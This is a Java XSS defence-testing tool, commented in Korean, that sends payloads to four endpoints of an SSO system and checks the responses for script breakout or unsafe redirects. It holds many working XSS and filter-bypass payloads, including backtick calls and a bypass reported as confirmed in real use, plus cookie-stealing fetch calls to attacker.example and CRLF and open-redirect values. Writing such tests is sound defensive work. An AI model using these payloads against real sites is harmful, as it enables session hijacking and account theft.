/*
 * XssDefenseTester  (JDK 1.8)
 * ------------------------------------------------------------------
 * SSO 8.1 XSS 방어(XssInterceptor / HubSecurityInterceptor / XssBlockFilter /
 * 출력 인코딩 / returnURL 검증)를 검증하는 독립 실행형 HTTP 호출기.
 *
 * 대상 (U-Plus XSS 대응 방안 문서 기준):
 *   Case1  /sso/ssoService.do                       returnURL   HTML attr / JS 컨텍스트
 *   Case2  /LGTSSO/portlets/smartworkPortlet.jsp     tp          JS 컨텍스트          (XssBlockFilter)
 *   Case3  /LGTSSO/portlets/salesPortlet.jsp         tp          HTML attr / 이벤트 핸들러 (XssBlockFilter)
 *   Case4  /hub/hub.do                               returnURL   JS 컨텍스트          (HubSecurityInterceptor)
 *
 * 판정 철학 (문서 4.4 / 9절과 동일):
 *   합격 기준은 "Interceptor/Filter가 차단했는가"가 아니라
 *   "위험 구문이 응답에서 '실행 가능한 위치'로 튀어나왔는가(breakout)"이다.
 *   차단으로 통과하든, 출력 인코딩으로 무해화돼 통과하든 둘 다 안전(PASS)으로 본다.
 *
 * HTTP 클라이언트만으로 판정 가능한 범위:
 *   - HTML attribute breakout (7.2)   : 정확 판정
 *   - returnURL scheme/host/CRLF (7.1) : 정확 판정
 *   - JavaScript 문자열 (7.3)          : escape 여부 + 원문 breakout 잔존까지만 → REVIEW
 *
 * 요구사항: JDK 1.8. 외부 라이브러리 없음.
 * 컴파일 : javac -encoding UTF-8 XssDefenseTester.java
 * 실행   : java -Dfile.encoding=UTF-8 XssDefenseTester
 *          java -Dfile.encoding=UTF-8 XssDefenseTester http://localhost:8080 localhost
 *   또는 환경변수: SSO_BASE_URL, SSO_REG_HOST, SSO_UNREG_HOST, SSO_ATTACKER_HOST, SSO_COOKIE
 *
 * 실행할 때마다 logs/xss-test_<timestamp>.log 파일에 콘솔 출력과 동일한 내용이 남고,
 * 각 케이스마다 실제로 호출한 전체 URL이 출력/로그에 그대로 남는다.
 *
 * ⚠ 본인 소유의 테스트/스테이징(로컬) 서버에만, 사전 승인하에 실행할 것. 운영 서버 금지.
 *   payload 안의 attacker 호스트로는 실제 요청을 보내지 않는다(응답 구조만으로 판정).
 * ------------------------------------------------------------------
 */

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class XssDefenseTester {

    /* ============================================================
     * 1. 설정 — 이 블록 또는 환경변수/CLI 인자로 지정한다.
     * ============================================================ */
    static final class Config {
        String baseUrl          = "http://localhost:8090"; // 로컬 실행 기본값 (local-tomcat 기본 HTTP 포트)
        String registeredHost   = "localhost";              // 문서 7.1 registered.example 대체(등록된 SSO 사이트)
        String unregisteredHost = "unregistered.example";
        String attackerHost     = "attacker.example";       // 문자열 판정용. 실제 호출 안 함.

        Map<String, String> headers = new LinkedHashMap<String, String>();
        {
            headers.put("User-Agent", "XssDefenseTester/1.0");
            // Cookie 는 환경변수 SSO_COOKIE 로 주입(코드에 하드코딩 금지)
        }

        int connectTimeoutMs = 10000;
        int readTimeoutMs     = 10000;

        // Interceptor/Filter 차단 신호(정보성) — 실제 앱의 차단 응답 형태를 보고 조정할 것
        // (HubSecurityInterceptor / XssBlockFilter가 실제로 어떤 응답을 주는지 확인 후 갱신)
        List<String> blockRedirectMarkers = Arrays.asList("/error", "xss", "invalid", "denied", "blocked");
        List<String> blockJsonMarkers     = Arrays.asList("\"result\":\"error\"", "\"code\":\"XSS", "xss", "blocked");
    }

    /* ============================================================
     * 2. 모델
     * ============================================================ */
    enum Ctx { INTERCEPTOR, HTML_ATTR, JS_STRING, URL_MOVE }
    enum Method { GET, POST }
    enum Expect { SAFE, FUNCTIONAL }
    enum Verdict { PASS, FAIL, REVIEW, ERROR }

    static final class Case {
        final String id; final Ctx ctx; final String path; final Method method;
        final String param; final String payload; final Expect expect;
        final Map<String, String> extra;
        Case(String id, Ctx ctx, String path, Method method, String param,
             String payload, Expect expect, Map<String, String> extra) {
            this.id = id; this.ctx = ctx; this.path = path; this.method = method;
            this.param = param; this.payload = payload; this.expect = expect;
            this.extra = (extra == null) ? Collections.<String, String>emptyMap() : extra;
        }
        Case(String id, Ctx ctx, String path, Method method, String param,
             String payload, Expect expect) {
            this(id, ctx, path, method, param, payload, expect, null);
        }
    }

    /** HttpURLConnection 응답을 담는 단순 컨테이너 */
    static final class Resp {
        final int status; final String location; final String body; final String url;
        Resp(int status, String location, String body, String url) {
            this.status = status; this.location = location; this.body = body; this.url = url;
        }
    }

    static final class Result {
        final Case c; final Verdict v; final String reason; final int status;
        final boolean interceptorFired; final String url;
        Result(Case c, Verdict v, String reason, int status, boolean fired, String url) {
            this.c = c; this.v = v; this.reason = reason; this.status = status;
            this.interceptorFired = fired; this.url = url;
        }
    }

    /* ============================================================
     * 3. 케이스 세트
     *    Case1~4 는 요청받은 4개 경로/파라미터. 각 경로마다
     *    "확인할 내용"에 맞춘 컨텍스트 payload + 블랙리스트 우회 확인용 추가 payload.
     * ============================================================ */
    static List<Case> buildCases(Config cfg) {
        List<Case> cs = new ArrayList<Case>();
        String reg   = cfg.registeredHost;
        String unreg = cfg.unregisteredHost;
        String atk   = cfg.attackerHost;

        // ===================================================================
        // Case1: /sso/ssoService.do  (returnURL) — HTML attribute 또는 JS 컨텍스트 반사
        //   *.do 경로이므로 기존 XssInterceptor 적용 대상. HttpForm hidden input / location.href 출력 지점.
        // ===================================================================
        String p1 = "/sso/ssoService.do";

        // (기존 Interceptor 대상 + 단어목록에 없어 우회 가능한 패턴 확인)
        cs.add(new Case("C1-INT-1", Ctx.INTERCEPTOR, p1, Method.GET, "returnURL",
                "<script>alert(1)</script>", Expect.SAFE));
        cs.add(new Case("C1-INT-2", Ctx.INTERCEPTOR, p1, Method.GET, "returnURL",
                "\"><img src=x onerror=alert(1)>", Expect.SAFE));
        cs.add(new Case("C1-INT-3", Ctx.INTERCEPTOR, p1, Method.GET, "returnURL",
                "console.log(document.cookie)", Expect.SAFE)); // XSS-WORD 목록에 없는 우회 확인용

        // HTML attribute 출력 (HttpForm hidden input value)
        cs.add(new Case("C1-ATTR-1", Ctx.HTML_ATTR, p1, Method.GET, "returnURL",
                "\" onmouseover=\"alert(1)", Expect.SAFE));
        cs.add(new Case("C1-ATTR-2", Ctx.HTML_ATTR, p1, Method.GET, "returnURL",
                "' onmouseover='alert(1)", Expect.SAFE));
        cs.add(new Case("C1-ATTR-3", Ctx.HTML_ATTR, p1, Method.GET, "returnURL",
                "\" oncontentvisibilityautostatechange=\"fetch('https://" + atk +
                        "?c='+document.cookie)\" style=\"content-visibility:auto", Expect.SAFE));
        cs.add(new Case("C1-ATTR-4", Ctx.HTML_ATTR, p1, Method.GET, "returnURL",
                "\"><script>alert(1)</script>", Expect.SAFE));

        // JavaScript 문자열 출력 (location.href="...")
        cs.add(new Case("C1-JS-1", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "';alert(1);//", Expect.SAFE));
        cs.add(new Case("C1-JS-2", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "\";alert(1);//", Expect.SAFE));
        cs.add(new Case("C1-JS-3", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "';fetch('https://" + atk + "?c='+document.cookie);//", Expect.SAFE));
        cs.add(new Case("C1-JS-4", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "';location='https://" + atk + "';//", Expect.SAFE));
        cs.add(new Case("C1-JS-5", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "</script><script>alert(1)</script>", Expect.SAFE));
        // (추가) 백틱 함수 호출 우회 — "(" ")" 없이 confirm/alert 호출, blacklist 단어 회피
        cs.add(new Case("C1-BACKTICK-1", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "\";confirm`XSS`//", Expect.SAFE));
        cs.add(new Case("C1-BACKTICK-2", Ctx.JS_STRING, p1, Method.GET, "returnURL",
                "';confirm`XSS`//", Expect.SAFE));

        // (추가) returnURL의 이동 대상 검증 — 문서 7.1 기준. 같은 파라미터이므로 회귀 확인용으로 포함.
        cs.add(new Case("C1-URL-1", Ctx.URL_MOVE, p1, Method.GET, "returnURL",
                "javascript:alert(1)", Expect.SAFE));
        cs.add(new Case("C1-URL-2", Ctx.URL_MOVE, p1, Method.GET, "returnURL",
                "//" + reg + "/path", Expect.SAFE));
        cs.add(new Case("C1-URL-3", Ctx.URL_MOVE, p1, Method.GET, "returnURL",
                "https://" + reg + "/path", Expect.FUNCTIONAL));

        // (추가) 파라미터 "이름" 대소문자 우회 확인 — 검증 로직이 정확히 "returnURL" 키만 보는데
        // 실제 값 소비 로직은 대소문자 무시로 파라미터를 읽는 불일치가 있는지 확인.
        cs.add(new Case("C1-PARAMCASE-1", Ctx.JS_STRING, p1, Method.GET, "RETURNURL",
                "';location='https://" + atk + "';//", Expect.SAFE));
        cs.add(new Case("C1-PARAMCASE-2", Ctx.HTML_ATTR, p1, Method.GET, "ReturnUrl",
                "\" onmouseover=\"alert(1)", Expect.SAFE));
        cs.add(new Case("C1-PARAMCASE-3", Ctx.URL_MOVE, p1, Method.GET, "returnurl",
                "javascript:alert(1)", Expect.SAFE));

        // ===================================================================
        // Case2: /LGTSSO/portlets/smartworkPortlet.jsp  (tp) — JavaScript 컨텍스트 반사
        //   *.jsp 경로라 XssInterceptor 적용 대상이 아님 -> XssBlockFilter가 유일한 서버측 방어.
        // ===================================================================
        String p2 = "/LGTSSO/portlets/smartworkPortlet.jsp";

        cs.add(new Case("C2-JS-1", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';alert(1);//", Expect.SAFE));
        cs.add(new Case("C2-JS-2", Ctx.JS_STRING, p2, Method.GET, "tp",
                "\";alert(1);//", Expect.SAFE));
        cs.add(new Case("C2-JS-3", Ctx.JS_STRING, p2, Method.GET, "tp",
                "');alert(1);//", Expect.SAFE));
        cs.add(new Case("C2-JS-4", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';fetch('https://" + atk + "?c='+document.cookie);//", Expect.SAFE));
        cs.add(new Case("C2-JS-5", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';location='https://" + atk + "';//", Expect.SAFE));
        cs.add(new Case("C2-JS-6", Ctx.JS_STRING, p2, Method.GET, "tp",
                "</script><script>alert(1)</script>", Expect.SAFE));
        // (추가) XssBlockFilter 우회 시도 — 대소문자 / 개행 삽입
        cs.add(new Case("C2-BYPASS-CASE", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';ALERT(1);//", Expect.SAFE));
        cs.add(new Case("C2-BYPASS-NEWLINE", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';\nalert(1);//", Expect.SAFE));
        // (추가) 파라미터 이름 대소문자 우회 확인
        cs.add(new Case("C2-PARAMCASE-1", Ctx.JS_STRING, p2, Method.GET, "TP",
                "';alert(1);//", Expect.SAFE));

        // (추가) 백틱(템플릿 리터럴) 함수 호출 우회 — 실사용 중 확인된 실제 우회.
        // "(" ")" 없이 `confirm\`XSS\`` 형태로 함수를 호출할 수 있고, "location" 같은 흔한
        // 단어 대신 blacklist에 없는 함수명을 쓰면 XSS-MARK(<,>,(,))도, XSS-WORD도 둘 다 피해간다.
        cs.add(new Case("C2-BACKTICK-1", Ctx.JS_STRING, p2, Method.GET, "tp",
                "ep/smartwork_header.jsp\";confirm`XSS`//", Expect.SAFE)); // 실제 확인된 payload
        cs.add(new Case("C2-BACKTICK-2", Ctx.JS_STRING, p2, Method.GET, "tp",
                "\";confirm`XSS`//", Expect.SAFE)); // 앞의 "정상처럼 보이는 경로" 접두사가 없어도 되는지
        cs.add(new Case("C2-BACKTICK-3", Ctx.JS_STRING, p2, Method.GET, "tp",
                "';confirm`XSS`//", Expect.SAFE)); // 홑따옴표 버전
        cs.add(new Case("C2-BACKTICK-4", Ctx.JS_STRING, p2, Method.GET, "tp",
                "\";alert`XSS`//", Expect.SAFE)); // 다른 함수명으로도 재현되는지
        cs.add(new Case("C2-BACKTICK-5", Ctx.JS_STRING, p2, Method.GET, "tp",
                "\";document['locat'+'ion']='https://" + atk + "'//", Expect.SAFE)); // "location" 단어 자체를 문자열 분할로 회피

        // ===================================================================
        // Case3: /LGTSSO/portlets/salesPortlet.jsp  (tp) — HTML attribute 또는 이벤트 핸들러 컨텍스트 반사
        // ===================================================================
        String p3 = "/LGTSSO/portlets/salesPortlet.jsp";

        cs.add(new Case("C3-ATTR-1", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\" onmouseover=\"alert(1)", Expect.SAFE));
        cs.add(new Case("C3-ATTR-2", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "' onmouseover='alert(1)", Expect.SAFE));
        cs.add(new Case("C3-ATTR-3", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\"autofocus onfocus=\"alert(1)", Expect.SAFE));
        cs.add(new Case("C3-ATTR-4", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\"><script>alert(1)</script>", Expect.SAFE));
        cs.add(new Case("C3-ATTR-5", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\" oncontentvisibilityautostatechange=\"fetch('https://" + atk +
                        "?c='+document.cookie)\" style=\"content-visibility:auto", Expect.SAFE));
        // (추가) XssBlockFilter 우회 시도 — 이벤트 핸들러 대소문자
        cs.add(new Case("C3-BYPASS-CASE", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\" OnMouseOver=\"alert(1)", Expect.SAFE));
        // (추가) 파라미터 이름 대소문자 우회 확인
        cs.add(new Case("C3-PARAMCASE-1", Ctx.HTML_ATTR, p3, Method.GET, "Tp",
                "\" onmouseover=\"alert(1)", Expect.SAFE));
        // (추가) 백틱 함수 호출 우회 — 이벤트 핸들러 속성 안에서도 "(" 없이 동작하는지 확인
        cs.add(new Case("C3-BACKTICK-1", Ctx.HTML_ATTR, p3, Method.GET, "tp",
                "\" onmouseover=confirm`XSS`", Expect.SAFE));

        // ===================================================================
        // Case4: /hub/hub.do  (returnURL) — JavaScript 컨텍스트 반사
        //   *.do 경로라 XssInterceptor + 신규 HubSecurityInterceptor 이중 적용 대상.
        // ===================================================================
        String p4 = "/hub/hub.do";

        cs.add(new Case("C4-INT-1", Ctx.INTERCEPTOR, p4, Method.GET, "returnURL",
                "<script>alert(1)</script>", Expect.SAFE));
        cs.add(new Case("C4-INT-2", Ctx.INTERCEPTOR, p4, Method.GET, "returnURL",
                "console.log(document.cookie)", Expect.SAFE));

        cs.add(new Case("C4-JS-1", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "';alert(1);//", Expect.SAFE));
        cs.add(new Case("C4-JS-2", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "\";alert(1);//", Expect.SAFE));
        cs.add(new Case("C4-JS-3", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "';fetch('https://" + atk + "?c='+document.cookie);//", Expect.SAFE));
        cs.add(new Case("C4-JS-4", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "';location='https://" + atk + "';//", Expect.SAFE));
        cs.add(new Case("C4-JS-5", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "</script><script>alert(1)</script>", Expect.SAFE));
        // (추가) 백틱 함수 호출 우회 — "(" ")" 없이 confirm/alert 호출, blacklist 단어 회피
        cs.add(new Case("C4-BACKTICK-1", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "\";confirm`XSS`//", Expect.SAFE));
        cs.add(new Case("C4-BACKTICK-2", Ctx.JS_STRING, p4, Method.GET, "returnURL",
                "';confirm`XSS`//", Expect.SAFE));

        // (추가) returnURL 이동 대상 검증 — 문서 7.1 기준. HubSecurityInterceptor가 이 역할까지 하는지 확인.
        cs.add(new Case("C4-URL-1", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "javascript:alert(1)", Expect.SAFE));
        cs.add(new Case("C4-URL-2", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "data:text/html,<script>alert(1)</script>", Expect.SAFE));
        cs.add(new Case("C4-URL-3", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "ftp://" + reg + "/path", Expect.SAFE));
        cs.add(new Case("C4-URL-4", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "//" + reg + "/path", Expect.SAFE));
        cs.add(new Case("C4-URL-5", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "https://" + unreg + "/path", Expect.SAFE));
        cs.add(new Case("C4-URL-6", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "https://" + reg + "/path%0d%0aSet-Cookie:test=1", Expect.SAFE));
        cs.add(new Case("C4-URL-7", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "https://" + reg + "/path", Expect.FUNCTIONAL));
        cs.add(new Case("C4-URL-8", Ctx.URL_MOVE, p4, Method.GET, "returnURL",
                "http://" + reg + "/path", Expect.FUNCTIONAL));

        // (추가) 파라미터 이름 대소문자 우회 확인 — HOST_NOT_ALLOWED 체크가 정확히 "returnURL" 키만
        // 보고 있다면, 다른 대소문자로 보냈을 때 이 검증이 스킵되면서 값은 그대로 쓰이는지가 핵심 확인 포인트.
        cs.add(new Case("C4-PARAMCASE-1", Ctx.URL_MOVE, p4, Method.GET, "RETURNURL",
                "javascript:alert(1)", Expect.SAFE));
        cs.add(new Case("C4-PARAMCASE-2", Ctx.URL_MOVE, p4, Method.GET, "ReturnUrl",
                "//" + unreg + "/path", Expect.SAFE));
        cs.add(new Case("C4-PARAMCASE-3", Ctx.JS_STRING, p4, Method.GET, "returnurl",
                "';alert(1);//", Expect.SAFE));

        return cs;
    }

    /* ============================================================
     * 4. HTTP 호출 (HttpURLConnection)
     * ============================================================ */
    static final class Http {
        final Config cfg;
        Http(Config cfg) { this.cfg = cfg; }

        String buildQueryString(Case c) throws Exception {
            String qs = enc(c.param) + "=" + enc(c.payload);
            for (Map.Entry<String, String> e : c.extra.entrySet()) {
                qs += "&" + enc(e.getKey()) + "=" + enc(e.getValue());
            }
            return qs;
        }

        /** 실제 호출 전에도 로그로 남길 수 있도록 요청 URL 문자열을 만든다. */
        String buildLoggableUrl(Case c) {
            try {
                String qs = buildQueryString(c);
                if (c.method == Method.GET) {
                    return cfg.baseUrl + c.path + "?" + qs;
                }
                return cfg.baseUrl + c.path + "  [POST body] " + qs;
            } catch (Exception e) {
                return cfg.baseUrl + c.path + "?" + c.param + "=(encoding error)";
            }
        }

        Resp send(Case c) throws Exception {
            String qs = buildQueryString(c);

            HttpURLConnection conn;
            String fullUrl;
            if (c.method == Method.GET) {
                fullUrl = cfg.baseUrl + c.path + "?" + qs;
                URL url = new URL(fullUrl);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
            } else {
                fullUrl = cfg.baseUrl + c.path + "  [POST body] " + qs;
                URL url = new URL(cfg.baseUrl + c.path);
                conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            }
            conn.setInstanceFollowRedirects(false); // 302를 직접 관찰
            conn.setConnectTimeout(cfg.connectTimeoutMs);
            conn.setReadTimeout(cfg.readTimeoutMs);
            for (Map.Entry<String, String> h : cfg.headers.entrySet()) {
                conn.setRequestProperty(h.getKey(), h.getValue());
            }

            if (c.method == Method.POST) {
                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.write(qs.getBytes("UTF-8"));
                out.flush();
                out.close();
            }

            int code = conn.getResponseCode();
            String location = conn.getHeaderField("Location"); // 대소문자 무관
            String body = readBody(conn, code);
            conn.disconnect();
            return new Resp(code, location == null ? "" : location, body, fullUrl);
        }

        private static String readBody(HttpURLConnection conn, int code) {
            InputStream is = null;
            try {
                is = (code >= 400) ? conn.getErrorStream() : conn.getInputStream();
                if (is == null) return "";
                BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = br.readLine()) != null) sb.append(line).append('\n');
                br.close();
                return sb.toString();
            } catch (Exception e) {
                return "";
            } finally {
                if (is != null) try { is.close(); } catch (Exception ignore) {}
            }
        }

        private static String enc(String s) throws Exception {
            return URLEncoder.encode(s, "UTF-8");
        }
    }

    /* ============================================================
     * 5. 판정
     * ============================================================ */
    static final class Judge {
        final Config cfg;
        Judge(Config cfg) { this.cfg = cfg; }

        boolean interceptorFired(Resp r) {
            if (r.status == 302 || r.status == 303) {
                String loc = r.location.toLowerCase(Locale.ROOT);
                for (String m : cfg.blockRedirectMarkers)
                    if (loc.contains(m.toLowerCase(Locale.ROOT))) return true;
            }
            if (r.status == 400 || r.status == 403) return true; // Filter/Interceptor가 요청 자체를 거부
            String body = r.body.toLowerCase(Locale.ROOT);
            for (String m : cfg.blockJsonMarkers)
                if (body.contains(m.toLowerCase(Locale.ROOT))) return true;
            return false;
        }

        Result judge(Case c, Resp r) {
            boolean fired = interceptorFired(r);

            if (c.expect == Expect.FUNCTIONAL) {
                if (fired || r.status >= 400)
                    return new Result(c, Verdict.FAIL,
                            "정상 값인데 차단/오류(false positive 가능). status=" + r.status, r.status, fired, r.url);
                return new Result(c, Verdict.PASS, "정상 흐름 진행", r.status, fired, r.url);
            }

            if (fired)
                return new Result(c, Verdict.PASS, "Interceptor/Filter 차단(반사 없음)", r.status, true, r.url);

            switch (c.ctx) {
                case HTML_ATTR: return judgeHtmlAttr(c, r.body, r.status, fired, r.url);
                case JS_STRING: return judgeJsString(c, r.body, r.status, fired, r.url);
                case URL_MOVE:  return judgeUrlMove(c, r, fired);
                default:        return judgeReflection(c, r.body, r.status, fired, r.url);
            }
        }

        private Result judgeHtmlAttr(Case c, String body, int status, boolean fired, String url) {
            String[] tokens = { "oncontentvisibilityautostatechange", "onmouseover=",
                    "onfocus=", "onerror=", "onload=", "onclick=", "style=\"content-visibility" };
            String outside = stripQuotedSpans(body).toLowerCase(Locale.ROOT);
            for (String t : tokens)
                if (outside.contains(t.toLowerCase(Locale.ROOT)))
                    return new Result(c, Verdict.FAIL,
                            "attribute breakout: 따옴표 밖 위험 속성 -> '" + t + "'", status, fired, url);
            if (outside.contains(cfg.attackerHost.toLowerCase(Locale.ROOT)))
                return new Result(c, Verdict.FAIL, "attacker host가 실행 위치에 반사됨", status, fired, url);
            return new Result(c, Verdict.PASS,
                    "payload가 value 내부 문자열로만 존재(속성 분리 없음)", status, fired, url);
        }

        private Result judgeJsString(Case c, String body, int status, boolean fired, String url) {
            String scripts = extractScripts(body);

            // payload 문자열 자체(탈출 따옴표부터 끝까지)가 script 영역에 그대로(escape 없이)
            // 남아있는지 직접 확인한다. 특정 함수명(alert/fetch/location)에 의존하는 고정 목록 대신
            // 이 방식을 쓰면 confirm`XSS`처럼 "(" ")" 없는 백틱 호출 우회도 함수명과 무관하게 잡힌다.
            // 선행 따옴표가 제대로 인코딩되면 이 매칭은 자연히 깨져서 안전한 경우는 걸리지 않는다.
            if (scripts.contains(c.payload)) {
                return new Result(c, Verdict.FAIL,
                        "payload가 script 영역에 escape 없이 그대로 반사됨 -> '"
                                + truncateForLog(c.payload, 60) + "'", status, fired, url);
            }

            if (scripts.toLowerCase(Locale.ROOT).contains(cfg.attackerHost.toLowerCase(Locale.ROOT))
                    && !isLikelyEscaped(scripts, cfg.attackerHost))
                return new Result(c, Verdict.FAIL,
                        "attacker host가 script 내부에 비-escape 상태로 존재", status, fired, url);
            return new Result(c, Verdict.REVIEW,
                    "escape된 것으로 보임. JS 실행 여부는 브라우저(개발자도구)로 최종 확인(7.3)", status, fired, url);
        }

        private Result judgeUrlMove(Case c, Resp r, boolean fired) {
            int status = r.status;
            String payloadLower = c.payload.toLowerCase(Locale.ROOT);

            if ((status == 302 || status == 303) && r.location.length() > 0) {
                String locLower = r.location.toLowerCase(Locale.ROOT);
                boolean toError = false;
                for (String m : cfg.blockRedirectMarkers)
                    if (locLower.contains(m.toLowerCase(Locale.ROOT))) { toError = true; break; }
                if (!toError && locLower.contains(hostOrHead(payloadLower)))
                    return new Result(c, Verdict.FAIL,
                            "거부 대상 URL로 실제 리다이렉트 -> Location: " + r.location, status, fired, r.url);
            }

            String outside = stripQuotedSpans(r.body).toLowerCase(Locale.ROOT);
            if (payloadLower.startsWith("javascript:") || payloadLower.startsWith("data:")
                    || payloadLower.startsWith("vbscript:")) {
                if (r.body.toLowerCase(Locale.ROOT).contains(payloadLower)
                        && !isLikelyEscaped(r.body, c.payload))
                    return new Result(c, Verdict.FAIL,
                            "위험 scheme URL이 무해화 없이 반사됨", status, fired, r.url);
            }
            if (outside.contains(cfg.attackerHost.toLowerCase(Locale.ROOT)))
                return new Result(c, Verdict.FAIL, "거부 대상 host가 실행 위치에 반사됨", status, fired, r.url);

            return new Result(c, Verdict.PASS,
                    "거부 대상 URL이 이동 타깃으로 살아있지 않음", status, fired, r.url);
        }

        private Result judgeReflection(Case c, String body, int status, boolean fired, String url) {
            String outside = stripQuotedSpans(body).toLowerCase(Locale.ROOT);
            String[] markers = { "<script", "onerror=", "onmouseover=", cfg.attackerHost };
            for (String m : markers)
                if (m != null && m.length() > 0 && outside.contains(m.toLowerCase(Locale.ROOT)))
                    return new Result(c, Verdict.FAIL,
                            "위험 구문이 실행 위치에 반사됨 -> '" + m + "'", status, fired, url);
            return new Result(c, Verdict.PASS,
                    "위험 구문 반사 없음(차단 또는 인코딩 완료)", status, fired, url);
        }

        /* ---- 유틸 ---- */
        private static String hostOrHead(String payloadLower) {
            int slash = payloadLower.indexOf("//");
            if (slash >= 0) {
                String rest = payloadLower.substring(slash + 2);
                int end = rest.indexOf('/');
                return end > 0 ? rest.substring(0, end) : rest;
            }
            return payloadLower.length() > 12 ? payloadLower.substring(0, 12) : payloadLower;
        }

        static String stripQuotedSpans(String s) {
            StringBuilder out = new StringBuilder(s.length());
            char quote = 0;
            for (int i = 0; i < s.length(); i++) {
                char ch = s.charAt(i);
                if (quote == 0) {
                    if (ch == '"' || ch == '\'') quote = ch; else out.append(ch);
                } else if (ch == quote) {
                    quote = 0;
                }
            }
            return out.toString();
        }

        private static final Pattern SCRIPT =
                Pattern.compile("<script[^>]*>(.*?)</script>", Pattern.DOTALL | Pattern.CASE_INSENSITIVE);
        private static final Pattern HREF =
                Pattern.compile("location\\.href\\s*=\\s*.*", Pattern.CASE_INSENSITIVE);

        static String extractScripts(String body) {
            StringBuilder sb = new StringBuilder();
            Matcher m = SCRIPT.matcher(body);
            while (m.find()) sb.append(m.group(1)).append('\n');
            Matcher h = HREF.matcher(body);
            while (h.find()) sb.append(h.group()).append('\n');
            return sb.toString();
        }

        static String truncateForLog(String s, int n) {
            return s.length() <= n ? s : s.substring(0, n) + "...";
        }

        static boolean isLikelyEscaped(String haystack, String needle) {
            int idx = haystack.toLowerCase(Locale.ROOT).indexOf(needle.toLowerCase(Locale.ROOT));
            if (idx < 0) return true;
            int from = Math.max(0, idx - 8);
            String w = haystack.substring(from, idx);
            return w.contains("\\u") || w.contains("&#") || w.contains("&quot;") || w.endsWith("\\");
        }
    }

    /* ============================================================
     * 6. 실행 & 리포트
     * ============================================================ */
    public static void main(String[] args) {
        String logFilePath = enableFileLogging();

        Config cfg = new Config();

        // 환경변수 오버라이드(민감정보는 코드에 넣지 말고 여기로)
        String v;
        if ((v = System.getenv("SSO_BASE_URL")) != null)      cfg.baseUrl = v;
        if ((v = System.getenv("SSO_REG_HOST")) != null)      cfg.registeredHost = v;
        if ((v = System.getenv("SSO_UNREG_HOST")) != null)    cfg.unregisteredHost = v;
        if ((v = System.getenv("SSO_ATTACKER_HOST")) != null) cfg.attackerHost = v;
        if ((v = System.getenv("SSO_COOKIE")) != null && v.length() > 0) cfg.headers.put("Cookie", v);

        // CLI 인자 오버라이드:  java XssDefenseTester <baseUrl> <regHost>
        if (args.length >= 1) cfg.baseUrl = args[0];
        if (args.length >= 2) cfg.registeredHost = args[1];

        Http http = new Http(cfg);
        Judge judge = new Judge(cfg);
        List<Case> cases = buildCases(cfg);
        List<Result> results = new ArrayList<Result>();

        System.out.println("=== XSS Defense Tester (JDK 1.8) ===");
        System.out.println("target   : " + cfg.baseUrl);
        System.out.println("regHost  : " + cfg.registeredHost);
        System.out.println("unregHost: " + cfg.unregisteredHost);
        System.out.println("atkHost  : " + cfg.attackerHost);
        System.out.println("cases    : " + cases.size());
        System.out.println("logFile  : " + logFilePath);
        System.out.println("--------------------------------------------------");

        for (Case c : cases) {
            String plannedUrl = http.buildLoggableUrl(c);
            try {
                Resp r = http.send(c);
                results.add(judge.judge(c, r));
            } catch (Exception e) {
                results.add(new Result(c, Verdict.ERROR,
                        "요청 실패: " + e.getClass().getSimpleName() + " " + e.getMessage(),
                        -1, false, plannedUrl));
            }
        }

        int pass = 0, fail = 0, review = 0, error = 0;
        for (Result r : results) {
            if (r.v == Verdict.PASS) pass++;
            else if (r.v == Verdict.FAIL) fail++;
            else if (r.v == Verdict.REVIEW) review++;
            else error++;
            System.out.println(String.format("[%-6s] %-16s %-10s (%d) param=%s",
                    r.v, r.c.id, r.c.ctx, r.status, r.c.param));
            System.out.println("  URL   : " + r.url);
            System.out.println("  payload: " + r.c.payload);
            System.out.println("  reason : " + r.reason
                    + (r.interceptorFired ? "  [interceptor/filter fired]" : ""));
        }

        System.out.println("--------------------------------------------------");
        System.out.println(String.format("PASS=%d  FAIL=%d  REVIEW=%d  ERROR=%d",
                pass, fail, review, error));
        if (review > 0)
